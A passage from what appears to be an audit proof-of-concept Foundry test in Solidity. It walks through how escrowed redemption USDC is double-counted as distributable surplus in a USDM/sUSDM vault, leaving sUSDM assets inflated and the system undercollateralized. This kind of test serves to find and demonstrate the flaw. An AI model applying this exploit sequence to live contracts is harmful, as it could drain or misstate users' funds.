    // 1. [Setup] Whale deposits 1,000,000 USDC to receive USDM
    // 2. [T=1] Whale requests redemption of all USDM. USDM is burned, obligation recorded in RedeemEscrow.
    // 3. [T=2] Operator calls fundRedemptions, moving 1,000,000 USDC to RedeemEscrow. Escrow is fully funded (shortfall = 0).
    // 4. [T=3] Accountant counts escrow USDC in totalBackingSigned(). Since USDM was burned, backing > outstanding USDM.
    // 5. [T=4] Accountant reports the escrow balance as distributableSurplus(). Operator settles and distributes this "yield".
    // 6. [T=5] Whale claims redemption, draining the 1,000,000 USDC from the system.
    // 7. [Assert] sUSDM totalAssets now exceeds actual vault backing, proving the system is undercollateralized.

    function test_exploit() public {
        address whale = address(0xdead);
        uint256 depositAmount = 1_000_000e6;

        // 1. Setup: Fund whale and deposit
        deal(address(usdc), whale, depositAmount);

        vm.startPrank(whale);
        usdc.approve(address(vault), depositAmount);
        vault.deposit(depositAmount);

        uint256 usdmBal = usdm.balanceOf(whale);
        assertGt(usdmBal, 0, "Whale should have USDM");

        // 2. Whale requests redemption
        usdm.approve(address(vault), usdmBal);
        uint256 reqId = vault.requestRedeem(usdmBal);
        vm.stopPrank();

        // 3. Operator funds the escrow
        vm.prank(operator);
        vault.fundRedemptions(depositAmount);

        // Verify escrow is fully funded and shortfall is 0
        uint256 escrowBal = usdc.balanceOf(address(redeemEscrow));
        assertEq(escrowBal, depositAmount, "Escrow should be fully funded");
        assertEq(redeemEscrow.shortfall(), 0, "Escrow shortfall should be 0");

        // 4. Check accountant surplus
        int256 surplus = accountant.distributableSurplus();
        assertGt(surplus, 0, "Surplus should be > 0 due to double counting");

        // 5. Operator settles and distributes the phantom yield
        vm.startPrank(operator);
        vault.settle(uint256(surplus));
        vault.distributeYield();
        vm.stopPrank();

        uint256 susdmAssetsBeforeClaim = susdm.totalAssets();
        assertGt(susdmAssetsBeforeClaim, 0, "sUSDM should have inflated assets from phantom yield");

        // 6. Whale claims redemption, draining the real USDC
        vm.prank(whale);
        vault.claimRedeem(reqId);

        // 7. Assert: System is now undercollateralized
        // The USDC left the system via claimRedeem, but sUSDM still claims it as assets.
        int256 finalBacking = accountant.totalBackingSigned();

        // The backing should now be significantly negative or less than sUSDM totalAssets
        // because the USDC was paid out but the yield was already distributed to sUSDM.
        assertLt(finalBacking, int256(susdmAssetsBeforeClaim), "System is undercollateralized: backing < sUSDM assets");
    }
}

